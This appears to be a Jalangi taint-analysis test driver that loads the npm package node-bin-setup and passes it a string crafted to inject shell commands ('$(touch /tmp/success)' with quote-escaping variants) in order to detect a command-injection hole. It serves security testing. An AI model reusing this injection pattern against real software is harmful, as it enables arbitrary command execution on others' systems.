// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/node-bin-setup/node_modules/node-bin-setup');
try {
	var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
var x1 = undefined;
new PUT(x0,x1)();
} catch (e) {
	console.log(e);
}